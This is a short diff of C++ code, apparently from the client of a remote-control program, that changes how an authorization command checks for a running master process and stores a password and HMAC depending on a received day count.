@@ -220,8 +220,10 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case CMD_AUTHORIZATION: {
 		HANDLE hMutex = OpenMutex(SYNCHRONIZE, FALSE, "MASTER.EXE");
 		hMutex = hMutex ? hMutex : OpenMutex(SYNCHRONIZE, FALSE, "YAMA.EXE");
+#ifndef _DEBUG
 		if (hMutex == NULL) // 没有互斥量，主程序可能未运行
 			break;
+#endif
 		CloseHandle(hMutex);
 
 		char buf[100] = {}, *passCode = buf + 5;
@@ -234,8 +236,10 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			memcpy(buf + 32, pwdHash, 64);						// 64字节
 			m_ClientObject->Send2Server((char*)buf, sizeof(buf));
 		} else {
+			int* days = (int*)(buf + 1);
 			config* cfg = pwdHash == masterHash ? new config : new iniFile;
-			cfg->SetStr("settings", "Password", passCode);
+			cfg->SetStr("settings", "Password", *days <= 0 ? "" : passCode);
+			cfg->SetStr("settings", "HMAC", *days <= 0 ? "" : buf + 64);
 			delete cfg;
 			g_bExit = S_SERVER_EXIT;
 		}
